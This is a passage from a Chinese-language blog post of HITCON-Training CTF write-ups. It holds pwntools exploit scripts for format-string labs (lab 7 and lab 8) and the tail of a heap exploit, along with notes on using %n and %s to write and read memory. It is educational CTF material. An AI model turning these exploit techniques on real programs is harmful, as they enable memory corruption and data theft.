class="line">add(fchunk_size,&apos;bbbb&apos;)  //抬高topchunk指针</span><br><span class="line"></span><br><span class="line">add(0x10,p64(magic)*2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="6-lab-8"><a href="#6-lab-8" class="headerlink" title="6 lab 8"></a>6 lab 8</h3><p>格式化字符串漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p=process(&apos;./craxme&apos;)</span><br><span class="line"></span><br><span class="line">#payload=p32(0x0804A038)+&apos;%218x7$hn&apos;</span><br><span class="line">MagicAddr=0x0804A038</span><br><span class="line">payload = fmtstr_payload(7, &#123;MagicAddr: 0xda&#125;)</span><br><span class="line">p.recvuntil(&quot;Give me magic :&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="7-lab7"><a href="#7-lab7" class="headerlink" title="7 lab7"></a>7 lab7</h3><p>格式化字符串漏洞</p>
<p><strong>基本的格式化字符串参数</strong></p>
<p>%c：输出字符，配上%n可用于向指定地址写数据。</p>
<p>%d：输出十进制整数，配上%n可用于向指定地址写数据。</p>
<p>%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。</p>
<p>%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。</p>
<p>%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。</p>
<p>%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。</p>
<p>%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p=process(&apos;./crack&apos;)</span><br><span class="line"></span><br><span class="line">payload=p32(0x0804A048)+&apos;#&apos;+&apos;%10$s&apos;+&apos;#&apos;   //0x0804A048是password地址，ida中可以找到</span><br><span class="line">print payload                             //&apos;#&apos;作为标志</span><br><span class="line">p.recvuntil(&quot;What your name ? &quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;#&quot;)</span><br><span class="line">r=p.recvuntil(&quot;#&quot;)</span><br><span class="line">print r    </span><br><span class="line">print r[:4] </span><br><span class="line">password=u32(r[:4])</span><br><span class="line">p.recvuntil(&quot;Your password :&quot;)</span><br><span class="line">p.sendline(str(password))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="cjvuc44ip0006ksu2k3l7g8gx" data-title=" HITCON-Training " data-url="http://yoursite.com/2019/01/28/HITCON-Training/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
var duoshuoQuery = {short_name: siteName};
(function() {
  var ds = document.createElement('script');
  ds.type = 'text/javascript';ds.async = true;
  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
  ds.charset = 'UTF-8';
  (document.getElementsByTagName('head')[0] 
  || document.getElementsByTagName('body')[0]).appendChild(ds);
})();</script></div><ul class="navication"><li class="home"><a href="/"><i class="icon icon-home"></i></a></li><li><a href="/2019/02/25/‘-2019安恒杯2月月赛pwn/"><i class="icon icon-arror-left"></i></a></li><li><a href="/2019/01/18/脱壳-两次内存断点法/"><i class="icon icon-arror-right"></i></a></li></ul><div class="page-footer"><div class="top"><ul class="social"><li><a href="https://github.com/BoizZ" title="Github" target="_blank"><i class="icon icon-github"></i></a></li><li><a title="Weibo" target="_blank"><i class="icon icon-weibo"></i></a></li><li><a title="SegmentFault" target="_blank"><i class="icon icon-segmentfault"></i></a></li></ul></div><div class="bottom"><p class="copyright">© 2019 NO<br><small>POWER BY <a href="https://hexo.io" target="_blank">HEXO</a></small><small>, THEME BY <a href="https://github.com/BoizZ/hexo-theme-laughing" target="_blank">LAUGHING</a></small></p></div></div></div><script>var wrap = document.getElementById('wrap');
window.onload = function () {
  wrap.className += ' done';
}</script></body></html>